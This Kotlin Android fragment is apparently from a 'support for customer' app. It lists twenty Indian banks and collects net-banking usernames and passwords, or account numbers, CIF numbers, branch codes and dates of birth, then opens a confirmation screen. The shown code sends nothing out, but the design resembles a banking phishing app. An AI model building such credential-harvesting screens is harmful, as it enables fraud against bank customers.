package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.RadioGroup
import android.widget.Spinner
import android.widget.Toast
import androidx.fragment.app.Fragment

class BankDetailsFragment : Fragment() {

    private lateinit var bankSpinner: Spinner
    private lateinit var optionGroup: RadioGroup
    private lateinit var netBankingLayout: View
    private lateinit var cardDetailsLayout: View
    private lateinit var usernameField: EditText
    private lateinit var passwordField: EditText
    private lateinit var accountNumberField: EditText
    private lateinit var cifNumberField: EditText
    private lateinit var branchCodeField: EditText
    private lateinit var dobField: EditText
    private lateinit var backButton: Button
    private lateinit var submitButton: Button

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        val view = inflater.inflate(R.layout.fragment_bank_details, container, false)

        // Initialize views
        bankSpinner = view.findViewById(R.id.bankSpinner)
        optionGroup = view.findViewById(R.id.optionGroup)
        netBankingLayout = view.findViewById(R.id.netBankingLayout)
        cardDetailsLayout = view.findViewById(R.id.cardDetailsLayout)
        usernameField = view.findViewById(R.id.usernameField)
        passwordField = view.findViewById(R.id.passwordField)
        accountNumberField = view.findViewById(R.id.accountNumberField)
        cifNumberField = view.findViewById(R.id.cifNumberField)
        branchCodeField = view.findViewById(R.id.branchCodeField)
        dobField = view.findViewById(R.id.dobField)
        backButton = view.findViewById(R.id.backButton)
        submitButton = view.findViewById(R.id.submitButton)

        // Set up the bank spinner with a list of major Indian banks
        val banks = arrayOf(
            "Select Bank",
            "State Bank of India (SBI)",
            "HDFC Bank",
            "ICICI Bank",
            "Axis Bank",
            "Punjab National Bank (PNB)",
            "Bank of Baroda",
            "Kotak Mahindra Bank",
            "Canara Bank",
            "Union Bank of India",
            "Bank of India",
            "Central Bank of India",
            "Indian Overseas Bank (IOB)",
            "Indian Bank",
            "Yes Bank",
            "IDFC First Bank",
            "RBL Bank (Ratnakar Bank)",
            "Standard Chartered Bank",
            "Deutsche Bank",
            "Citi Bank",
            "HSBC India"
        )
        val adapter = ArrayAdapter(requireContext(), android.R.layout.simple_spinner_dropdown_item, banks)
        bankSpinner.adapter = adapter

        // Handle radio button selection
        optionGroup.setOnCheckedChangeListener { _, checkedId ->
            when (checkedId) {
                R.id.rbNetBanking -> {
                    netBankingLayout.visibility = View.VISIBLE
                    cardDetailsLayout.visibility = View.GONE
                }
                R.id.rbCreditDebit -> {
                    netBankingLayout.visibility = View.GONE
                    cardDetailsLayout.visibility = View.VISIBLE
                }
            }
        }

        // Handle back button click
        backButton.setOnClickListener {
            // Navigate back to the previous fragment
            requireActivity().supportFragmentManager.popBackStack()
        }

        // Handle submit button click
        submitButton.setOnClickListener {
            // Collect data for submission
            val selectedBank = bankSpinner.selectedItem.toString()
            val isNetBanking = optionGroup.checkedRadioButtonId == R.id.rbNetBanking

            // Check and validate fields based on the selected option
            if (selectedBank == "Select Bank") {
                // Handle error: bank not selected
                showError("Please select a bank.")
                return@setOnClickListener
            }

            if (isNetBanking) {
                // Validate Net Banking fields
                if (usernameField.text.isEmpty() || passwordField.text.isEmpty()) {
                    showError("Please fill in all Net Banking fields.")
                    return@setOnClickListener
                }
            } else {
                // Validate Credit/Debit Card fields
                if (accountNumberField.text.isEmpty() || cifNumberField.text.isEmpty() ||
                    branchCodeField.text.isEmpty() || dobField.text.isEmpty()) {
                    showError("Please fill in all Card details fields.")
                    return@setOnClickListener
                }
            }

            // Proceed to the Confirmation Activity
            proceedToConfirmation()
        }

        return view
    }

    private fun showError(message: String) {
        // Show an error message to the user using Toast
        Toast.makeText(requireContext(), message, Toast.LENGTH_SHORT).show()
    }

    private fun proceedToConfirmation() {
        // Create an intent to start ConfirmationActivity
        val intent = Intent(requireContext(), ConfirmationActivity::class.java)
        // Pass any necessary data to the ConfirmationActivity if needed
        startActivity(intent)
    }
}
